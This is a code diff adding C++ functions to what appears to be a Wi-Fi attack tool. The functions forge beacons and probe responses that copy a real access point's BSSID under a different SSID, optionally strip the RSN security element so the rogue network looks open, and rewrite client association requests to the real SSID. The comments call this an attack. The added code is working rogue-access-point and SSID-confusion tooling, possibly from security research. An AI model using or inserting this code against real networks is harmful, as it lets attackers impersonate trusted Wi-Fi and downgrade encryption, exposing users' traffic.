@@ -215,4 +215,75 @@ void stop_ap(const string &iface, const optional<string> &netns){
 	log(LogLevel::INFO, "Stopping AP using: iw dev {} ap stop", iface);
 	hw_capabilities::run_cmd(cmd, netns);
 }
+
+// wifi_util.cpp
+
+Dot11Beacon make_confused_beacon(const Dot11Beacon &real, const string &confused_ssid, const bool strip_rsn){
+	auto b = Dot11Beacon();
+	b.addr1(real.addr1());
+	b.addr2(real.addr2()); // BSSID kept identical to real AP — key to the attack
+	b.addr3(real.addr3());
+	b.timestamp(real.timestamp());
+	b.interval(real.interval());
+	b.capabilities() = real.capabilities();
+
+	for(const auto &opt: real.options()){
+		if(opt.option() == Dot11::SSID){
+			b.add_option({Dot11::SSID,
+				static_cast<uint8_t>(confused_ssid.size()),
+				reinterpret_cast<const uint8_t*>(confused_ssid.data())});
+		} else if(strip_rsn && opt.option() == Dot11::RSN){
+			continue; // drop RSN IE — rogue beacon appears as an open network
+		} else{
+			b.add_option(opt);
+		}
+	}
+	return b;
+}
+
+Dot11ProbeResponse make_confused_probe_resp(const Dot11ProbeResponse &real, const string &confused_ssid,
+											const bool strip_rsn){
+	auto resp = Dot11ProbeResponse();
+	resp.addr1(real.addr1());
+	resp.addr2(real.addr2());
+	resp.addr3(real.addr3());
+	resp.timestamp(real.timestamp());
+	resp.interval(real.interval());
+	resp.capabilities() = real.capabilities();
+
+	for(const auto &opt: real.options()){
+		if(opt.option() == Dot11::SSID){
+			resp.add_option({Dot11::SSID,
+				static_cast<uint8_t>(confused_ssid.size()),
+				reinterpret_cast<const uint8_t*>(confused_ssid.data())});
+		} else if(strip_rsn && opt.option() == Dot11::RSN){
+			continue;
+		} else{
+			resp.add_option(opt);
+		}
+	}
+	return resp;
+}
+
+Dot11AssocRequest make_real_ssid_assoc_req(const Dot11AssocRequest &assoc, const string &real_ssid){
+	auto req = Dot11AssocRequest();
+	req.addr1(assoc.addr1());
+	req.addr2(assoc.addr2());
+	req.addr3(assoc.addr3());
+	req.capabilities() = assoc.capabilities();
+	req.listen_interval(assoc.listen_interval());
+	req.seq_num(assoc.seq_num());
+
+	for(const auto &opt: assoc.options()){
+		if(opt.option() == Dot11::SSID){
+			req.add_option({Dot11::SSID,
+				static_cast<uint8_t>(real_ssid.size()),
+				reinterpret_cast<const uint8_t*>(real_ssid.data())});
+		} else{
+			req.add_option(opt);
+		}
+	}
+	return req;
+}
+
 }
